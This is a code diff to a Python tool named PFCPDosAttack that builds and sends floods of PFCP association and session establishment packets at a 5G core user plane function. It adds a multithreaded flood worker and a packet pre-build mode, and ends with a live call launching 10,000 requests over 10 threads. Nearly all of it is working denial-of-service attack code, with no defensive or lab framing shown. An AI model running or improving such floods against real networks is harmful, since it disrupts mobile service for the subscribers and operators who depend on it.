@@ -172,9 +172,20 @@ class PFCPDosAttack:
         self.teid_counter = 1
         self.ue_base_addr = ipaddress.IPv4Address(ue_start_addr)
         self._ue_counter = 1
-        self.pfcp_association_packet_list = []
+        self.pfcp_association_packet= None
         self.pfcp_establishment_packet_list = []
         self.verbose = False
+        self.prepare = False
+        
+        
+    def set_prepare(self, prepare=True):
+        self.prepare = prepare
+        if not self.verbose : return
+        if prepare:
+            print("[DoS] Prepare mode enabled")
+        else:
+            print("[DoS] Prepare mode disabled")
+            
         
     def new_ue_addr(self):
         next_ip = self.ue_base_addr + self._ue_counter
@@ -213,30 +224,44 @@ class PFCPDosAttack:
     def prepare_pfcp_session_establishment_flood(self, count):
         print(f"[DoS] Preparing {count} PFCP session establishment packets")
         pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
+        
         for i in range(count):
-            self.pfcp_association_packet_list.append(pfcp_obj.Build_PFCP_association_setup_req())
             self.pfcp_establishment_packet_list.append(pfcp_obj.Build_PFCP_session_establishment_req(
                 seid=self.new_seid(), 
                 ue_addr=self.new_ue_addr(),
                 teid=self.new_teid()))
-        print(f"[DoS] Prepared {count} PFCP association setup packets")
+        print(f"[DoS] Prepared the PFCP association setup packet")
         print(f"[DoS] Prepared {count} PFCP session establishment packets")
                 
     
     def pfcp_session_establishment_flood_worker(self, count):
         if self.verbose:
             print(f"[DoS][Worker] Worker starts flooding with {count} requests")
+            
+            
         
-        
-        for i in range(count):
-            send(self.pfcp_association_packet_list[i])
-            send(self.pfcp_establishment_packet_list[i])
+        if self.prepare:
+            for i in range(count):
+                send(self.pfcp_establishment_packet_list[i])
+        else:
+            pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
+            for i in range(count):
+                pfcp_obj.Send_PFCP_session_establishment_req(
+                    seid=self.new_seid(), 
+                    ue_addr=self.new_ue_addr(),
+                    teid=self.new_teid()
+                )
+                
+            
         if self.verbose:
             print(f"[DoS][Worker] Worker finished flooding with {count} requests")
 
     
     def Start_pfcp_session_establishment_flood(self, reqNbr=100, num_threads=1):
-        self.prepare_pfcp_session_establishment_flood(reqNbr)
+        if self.prepare:
+            self.prepare_pfcp_session_establishment_flood(reqNbr)
+        
+        
         if self.verbose:
             print(f"[DoS] Starting PFCP session establishment flood with {reqNbr} requests and {num_threads} threads")
         
@@ -244,7 +269,13 @@ class PFCPDosAttack:
         per_thread = reqNbr // num_threads
         remaining = reqNbr % num_threads
 
+        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
+        pfcp_association_packet = pfcp_obj.Build_PFCP_association_setup_req()
+        
         start_time = time.time()
+        
+        send(pfcp_association_packet)
+        
         for i in range(num_threads):
             count = per_thread + (1 if i < remaining else 0)
             t = threading.Thread(target=self.pfcp_session_establishment_flood_worker, args=(count,))
@@ -303,28 +334,34 @@ class PFCPDosAttack:
 
 
 
-monseidbidon = 0x1
+# monseidbidon = 0x1
 
-def increment_monseid():
-    global monseidbidon
-    monseidbidon += 1
-    if monseidbidon > 0xFFFFFFFFFFFFFFFF:
-        monseidbidon = 1
-    return monseidbidon
+# def increment_monseid():
+#     global monseidbidon
+#     monseidbidon += 1
+#     if monseidbidon > 0xFFFFFFFFFFFFFFFF:
+#         monseidbidon = 1
+#     return monseidbidon
 
-ue_base_addr_bidon = "1.1.1.1"
+# ue_base_addr_bidon = "1.1.1.1"
 
-def increment_base_addr_bidon():
-    global ue_base_addr_bidon
-    ue_base_addr_bidon = ipaddress.IPv4Address(ue_base_addr_bidon) + 1
-    return str(ue_base_addr_bidon)
+# def increment_base_addr_bidon():
+#     global ue_base_addr_bidon
+#     ue_base_addr_bidon = ipaddress.IPv4Address(ue_base_addr_bidon) + 1
+#     return str(ue_base_addr_bidon)
 
-def flood_attack(evil_addr, upf_addr, src_port, dest_port, count, ue_base_addr="1.1.1.1"):
-    pfcp_obj = Ez_PFCP(evil_addr, upf_addr, src_port, dest_port)
-    pfcp_obj.Send_PFCP_association_setup_req()
-    for i in range(count):
-        pfcp_obj.Send_PFCP_session_establishment_req(seid=increment_monseid(), ue_addr=increment_base_addr_bidon())
+# def flood_attack(evil_addr, upf_addr, src_port, dest_port, count, ue_base_addr="1.1.1.1"):
+#     pfcp_obj = Ez_PFCP(evil_addr, upf_addr, src_port, dest_port)
+#     pfcp_obj.Send_PFCP_association_setup_req()
+#     for i in range(count):
+#         pfcp_obj.Send_PFCP_session_establishment_req(seid=increment_monseid(), ue_addr=increment_base_addr_bidon())
         
 
 
-flood_attack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 1000)
+# flood_attack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 1000)
+
+
+
+objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
+objet_dos.set_verbose(True)
+objet_dos.Start_pfcp_session_establishment_flood(reqNbr=10000, num_threads=10)
